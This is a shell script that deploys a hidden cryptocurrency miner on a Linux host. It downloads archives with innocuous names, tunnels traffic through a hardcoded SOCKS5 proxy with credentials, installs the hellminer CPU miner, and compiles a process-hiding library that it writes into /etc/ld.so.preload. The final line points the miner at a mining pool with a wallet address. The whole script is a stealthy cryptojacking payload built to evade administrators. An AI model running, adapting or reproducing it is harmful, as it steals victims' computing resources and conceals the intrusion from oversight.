#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && apt install -y ocl-icd-opencl-dev

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 185.212.160.28:7043
socks5_username = ingfoingfo
socks5_password = maszZeehh
END


./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz 
tar xf hellminer_cpu_linux.tar.gz   
 
./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
unzip magicBezzHash.zip 
make 
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
mv libprocesshider.so /usr/local/lib/ 
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
 
./graftcp/graftcp stratum+tcp://blockmasters.co:4459 -u TP7jVMfWwALwX2xBHkw6fA3qJWxiKyQkhz -p c=TRX -p x --cpu $(nproc --all)
